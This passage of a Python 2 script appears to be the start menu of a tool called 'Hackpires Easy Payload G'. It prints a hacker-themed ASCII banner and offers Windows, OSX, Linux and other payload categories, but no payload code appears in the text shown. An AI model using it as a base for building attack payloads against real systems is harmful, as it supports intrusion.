	print ("\n")
	print (
		"""    __  __           __         _""")
	print (
		"""   / / / /___ ______/ /______  (_)_______  _____""")
	print (
		"""  / /_/ / __ `/ ___/ //_/ __ \/ / ___/ _ \/ ___/ """)
	print (
		""" / __  / /_/ / /__/ ,< / /_/ / / /  /  __(__  )""")
	print (
		"""/_/ /_/\__,_/\___/_/|_/ .___/_/_/   \___/____/""")
	print (
		"""                     /_/""")
	print (" Infosec By Day Hackers By Night")

	print ("\n")
	print (" <Hack all the Things Responsibly >")

	print (
    """       \   ^__^ """)
	print (
		"""	\  (oo)\_______ """)
	print (
		"""           (__)\       )\/\ """)
	print (
	    	"""               ||----w | """)
	print (
			"""               ||     || """)
	print ("\n")
	print (" Welcome to Hackpires Easy Payload G")
	print ("\n")

	print (" 1 Windows Payloads")
	print (" 2 OSX Payloads")
	print (" 3 Linux Payloads")
	print (" 4 Other Payloads")
	print (" 99 Exit")

	os_select = raw_input (" Select OS:")

	if os_select == "1":
		windows_payloads()
	elif os_select == "2":
		osx_payloads()
	elif os_select == "3":
		linux_payloads()
	elif os_select == "4":
		other_payloads()
	elif os_select == "99":
		quit()
	else:
		start()



start()
